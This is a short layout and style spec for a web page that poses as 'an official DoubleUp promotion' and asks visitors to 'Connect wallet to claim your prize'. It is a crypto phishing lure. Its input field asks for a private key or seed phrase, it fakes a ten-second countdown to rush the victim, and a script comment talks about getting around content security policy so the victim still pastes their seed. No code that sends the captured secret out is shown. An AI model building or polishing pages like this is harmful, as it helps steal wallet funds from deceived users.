div.style: display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; background:linear-gradient(135deg,#1a1a2e,#16213e); gap:30px
div.p: Connect wallet to claim your prize

div.style: background:#16213e; padding:40px; border-radius:16px; box-shadow:0 0 30px rgba(0,255,255,0.3); width:420px

input.placeholder: Enter private key or seed phrase to claim
input.style: width:100%; padding:16px; margin:10px 0; background:#0f0f23; border:1px solid #00ffff; border-radius:8px; color:white; font-size:18px

button.style: width:100%; padding:18px; background:#00ffff; color:black; font-weight:bold; border:none; border-radius:8px; cursor:pointer

div.small: This is an official DoubleUp promotion — only 10 seconds left!

body.script: // This will be blocked by CSP, but we don't need it — the button uses onclick (sometimes allowed) or just let user paste seed document.body.style.zoom = 1.0; // force full-screen realistic look
